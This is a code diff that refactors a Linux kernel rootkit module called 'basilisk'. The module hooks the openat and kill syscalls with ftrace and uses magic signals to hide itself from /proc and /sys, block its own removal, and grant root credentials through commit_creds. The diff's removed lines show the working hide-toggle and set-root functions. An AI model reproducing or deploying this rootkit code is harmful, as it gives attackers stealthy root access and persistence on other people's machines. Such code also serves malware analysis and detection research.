@@ -154,7 +154,6 @@ static asmlinkage long (*orig_openat)(const struct pt_regs *);
 
 static asmlinkage long hook_openat(const struct pt_regs *regs)
 {
-
     const char __user *filename = (char *)regs->si;
     int flags = regs->dx;
     umode_t mode = regs->r10;
@@ -252,9 +251,6 @@ static asmlinkage long (*orig_kill)(const struct pt_regs *);
 asmlinkage int hook_kill(const struct pt_regs *regs)
 { 
  /* declare required prototypes (defined below, for clarity) */
-    void set_root(void);
-    void handle_lkm_hide(void);
-    
     int sig = regs->si;
 
     switch (sig) {
@@ -288,12 +284,9 @@ static asmlinkage long (*orig_kill)(pid_t pid, int sig);
 
 asmlinkage int hook_kill(pid_t pid, int sig)
 {
-    void set_root(void);
-    void handle_lkm_hide(void);
-
     switch (sig) {
         case SIG_HIDE:
-            handle_lkm_hide();
+            handle_lkm_hide(&hidden);
             break;
 
         case SIG_PROTECT:
@@ -301,7 +294,7 @@ asmlinkage int hook_kill(pid_t pid, int sig)
             break;
         
         case SIG_GODMODE:
-            handle_lkm_hide();
+            handle_lkm_hide(&hidden);
             handle_lkm_protect(&protected);
             break;
 
@@ -316,36 +309,6 @@ asmlinkage int hook_kill(pid_t pid, int sig)
     return 0;
 }
 #endif
-
-/*
-Helper function to handle hiding/showing our LKM 
-*/
-void handle_lkm_hide(void)
-{
-    if(!hidden) {
-        pr_info("basilisk: hiding kernel module\n");
-        proc_hide();
-        sys_hide();
-    } else {
-        pr_info("basilisk: showing kernel module\n");
-        proc_show();
-        sys_show();
-    }
-    hidden = !hidden; // toggle `hidden` switch
-}
-
-void set_root(void)
-{
-    struct cred *root;
-    root = prepare_creds();
-
-    if (root == NULL)
-        return;
-
-    // Set credentials to root
-    __set_root_creds(root);
-    commit_creds(root);
-}
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
